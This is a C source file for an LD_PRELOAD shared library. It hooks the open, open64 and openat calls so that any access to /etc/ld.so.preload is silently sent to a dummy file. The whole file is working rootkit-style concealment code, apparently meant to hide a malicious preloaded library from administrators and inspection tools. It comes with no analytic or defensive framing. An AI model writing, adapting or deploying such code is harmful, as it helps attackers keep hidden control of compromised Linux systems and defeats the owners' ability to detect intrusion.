#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stddef.h>

// Hook for standard open
int open(const char *pathname, int flags, ...) {
    static int (*orig_open)(const char*, int, mode_t) = NULL;
    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");

    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }

    if (strstr(pathname, "/etc/ld.so.preload")) {
        return orig_open("/etc/ld.so.preload.dummy", flags, mode);
    }
    return orig_open(pathname, flags, mode);
}

// Hook for open64 (common on 64-bit and for large files)
int open64(const char *pathname, int flags, ...) {
    static int (*orig_open64)(const char*, int, mode_t) = NULL;
    if (!orig_open64) orig_open64 = dlsym(RTLD_NEXT, "open64");

    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }

    if (strstr(pathname, "/etc/ld.so.preload")) {
        return orig_open64("/etc/ld.so.preload.dummy", flags, mode);
    }
    return orig_open64(pathname, flags, mode);
}

// Hook for openat (used by modern tools like 'ls' or 'cat' in some distros)
int openat(int dirfd, const char *pathname, int flags, ...) {
    static int (*orig_openat)(int, const char*, int, mode_t) = NULL;
    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");

    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }

    if (strstr(pathname, "/etc/ld.so.preload")) {
        return orig_openat(dirfd, "/etc/ld.so.preload.dummy", flags, mode);
    }
    return orig_openat(dirfd, pathname, flags, mode);
}

